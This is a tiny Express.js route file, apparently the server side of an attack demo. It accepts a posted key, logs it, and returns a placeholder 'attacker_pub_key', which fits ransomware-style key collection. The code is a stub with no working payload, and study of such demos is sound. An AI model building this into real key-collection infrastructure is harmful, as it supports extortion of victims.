var express = require('express');
var router = express.Router();

/* GET home page. */
router.post('/', function(req, res, next) {
  let {key} = req.body;
  let attacker_pub_key = "YOUR PUB KEY";
  console.log(key);
  res.send(attacker_pub_key);
});

module.exports = router;
